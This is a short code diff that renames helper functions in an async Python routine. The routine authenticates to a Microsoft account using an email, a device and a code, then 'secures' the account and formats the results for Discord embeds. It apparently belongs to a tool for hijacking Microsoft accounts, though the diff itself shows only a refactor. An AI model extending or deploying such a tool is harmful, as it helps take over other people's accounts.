@@ -1,19 +1,19 @@
-from securing.utils.get_livedata import getLiveData
-from securing.utils.polish_host import polishHost
-from auth.initial_session import getSession
+from securing.utils.get_livedata import livedata
+from securing.build_embeds import build_account_data
+from securing.utils.polish_host import polish_host
+from auth.initial_session import get_session
 from securing.utils.secure import secure
-from auth.get_msaauth import getMSAAUTH
-from securing.build_embeds import buildAccountData
+from auth.get_msaauth import get_msaauth
 import httpx
 import time
 
 async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
     # Handles the data to be displayed in embeds to discord
     
-    session = getSession()
+    session = get_session()
     
-    data = await getLiveData(session)
-    msaauth = await getMSAAUTH(session, email, device, data, code)
+    data = await livedata(session)
+    msaauth = await get_msaauth(session, email, device, data, code)
     
     account = {
         "microsoft": {
@@ -54,10 +54,10 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
             account["microsoft"]["security_email"] = "Child Locked"
             
         case _:
-            await polishHost(session, msaauth)
+            await polish_host(session, msaauth)
             account = await secure(session, recovery, account)
 
     finalTime = (time.time() - initialTime)
 
-    account = await buildAccountData(account, finalTime)
+    account = await build_account_data(account, finalTime)
     return account
